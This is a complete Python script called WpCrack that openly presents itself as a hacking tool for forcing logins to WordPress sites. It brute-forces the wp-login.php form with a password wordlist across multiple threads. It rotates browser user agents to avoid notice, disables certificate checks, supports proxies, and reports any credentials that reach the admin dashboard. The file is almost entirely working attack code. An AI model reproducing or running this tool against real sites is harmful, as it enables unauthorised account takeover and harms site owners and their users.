#!/usr/bin/python
"""
WpCrack is a hacking tool used to force login into the CMS WordPress website application.
Copyright © 2021 Andrew <andrevirdiaz@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import os
import re
import ssl
import time
import random
import logging
import urllib.parse
import urllib.request

from pathlib import Path
from datetime import datetime
from argparse import FileType
from argparse import SUPPRESS
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor


NAME = "WpCrack Brute Froce Tool"
BANNER = """\
      .---.        .-----------
     /     \  __  /    ------
    / /     \(  )/    -----
   //////   ' \/ `   ---
  //// / // : ★★ : ---
 // /   /  /`    '--
//          //..\\   %s
       ====UU====UU==========================
           '//||\\`
             ''``
""" % (NAME)
VERSION = "1.1.2" # <major> <minor> <path>

""" logger """
LOGGERNAME = Path(__file__).stem
logging.basicConfig(format="[%(asctime)s][%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger(LOGGERNAME)
log.setLevel(logging.INFO)
logging.addLevelName(60, "SUCCESS")
def success(self, message, *args, **kws):
    if self.isEnabledFor(60):
        self._log(60, message, args, **kws) 
logging.Logger.success = success
logging.addLevelName(70, "FAILED")
def failed(self, message, *args, **kws):
    if self.isEnabledFor(70):
        self._log(70, message, args, **kws) 
logging.Logger.failed = failed

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
userAgent = [
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
   "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0",
   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
   "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
   "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
   "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0"
]


""" print banner """
def printBanner(start = False):
   current_time = ""
   if start is True:
      current_time = "[*] starting at " + datetime.now().strftime("%H:%M:%S (%d-%m-%Y)")
   print(BANNER + current_time + "\n\n")
   
""" read list """
def sliceList(content):
   lists = []
   content = content.readlines()
   for line in content:
      lists.append(line.replace("\n", ""))
   return lists
   
""" login to target """
def login(url, username, password, timeout, proxy):
    global userAgent
    
    url = urllib.parse.urljoin(url, "/wp-login.php/")
    form = "log={}&pwd={}".format(username, password)
    form = bytes(form, "utf-8")
    headers = {
        "User-Agent" : random.choice(userAgent)
    }
    
    try:
        request = urllib.request.Request(url, data=form, headers=headers)
        
        if proxy is not None:
            request.set_proxy(proxy, ["http", "https"])
            
        with urllib.request.urlopen(request, timeout=timeout, context=context) as response:
            if re.search("wp-admin", response.url):
                return password
            else:
                return False
    except urllib.error.URLError as error:
        log.critical(error)
        os._exit(0)
    except Exception as error:
        log.critical(error)
        os._exit(0)
    
   
if __name__ == "__main__":
    """ argument """
    parser = ArgumentParser(
      usage="python %(prog)s [options]",
      epilog="Copyright © 2021 Andrew - Powered by Indonesian Darknet",
    )
    parser.add_argument("-V", "--version", action="version", version=VERSION)
    parser.add_argument("-d", "--debug", action="store_const", const=logging.DEBUG, help="debugging mode")
    target = parser.add_argument_group("target arguments")
    target.add_argument("-t", "--target", dest="url", metavar="", help="url of the target", required=True)
    target.add_argument("-u", "--username", dest="usr", metavar="", default="admin", help="username of the target (default: %(default)s)")
    target.add_argument("-p", "--password", dest="pwd", metavar="", help="password of the target (change -p to --p to use a wordlist)")
    target.add_argument("--p", dest="pwd_list", type=FileType('r'), help=SUPPRESS)
    request = parser.add_argument_group()
    request.add_argument("--timeout", metavar="", type=int, default=5, help="timed out for requests (default: %(default)s)")
    request.add_argument("--thread", metavar="", type=int, default=5, help="numbers of threading (default: %(default)s)")
    request.add_argument("--proxy", metavar="", help="using a proxy (ex: 127.0.0.1:8080)")
    args = parser.parse_args()
    
    """ print banner firts start """
    printBanner(True)
    
    if args.debug:
        log.setLevel(args.debug)
    
    password = []
    
    if args.pwd:
      password.append(args.pwd)
    elif args.pwd_list:
      password = sliceList(args.pwd_list)
    else:
      parser.error("the following arguments are required: -p/--p")
      
    try:
        log.info("testing connection to the target")
        
        request = urllib.request.Request(args.url)
        urllib.request.urlopen(request, timeout=args.timeout, context=context)
        
        start_time = time.time()
        success_login = False
        
        if len(password) > 1:
            log.debug("total data in wordlist: " + str(len(password)) + " words")
        log.info("starting a login brute force")
        
        with ThreadPoolExecutor(max_workers=args.thread) as executor:
            processed = (executor.submit(login, args.url, args.usr, pwd, args.timeout, args.proxy) for pwd in password)
            
            for i, process in enumerate(as_completed(processed)):
                if len(password) > 1:
                    print("[{}][INFO] testing {} password".format(datetime.now().strftime("%H:%M:%S") ,i), end="\r")
                
                process = process.result()
                if process is not False:
                    success_login = True
                    password = process
                    break
                
            if success_login is True:
                log.success("successfully entered into the target dashboard with username \""+args.usr+"\" and password \""+password+"\"")
            else:
                log.failed("cannot enter into the target dashboard")
            
            log.info("time taken \""+ str(int(time.time() - start_time)) +" seconds\"")
            
    except Exception as error:
        log.critical(error)